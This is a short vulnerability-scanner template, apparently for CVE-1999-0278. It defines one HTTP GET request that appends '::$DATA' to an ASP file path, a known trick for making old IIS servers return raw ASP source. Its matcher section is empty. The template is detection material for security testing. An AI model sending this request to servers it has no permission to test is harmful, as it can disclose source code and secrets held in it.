vuln_id = ["CVE-1999-0278", "AVE-1999-00001"]

[poc]
logic = "any"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/somefile.asp::$DATA"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
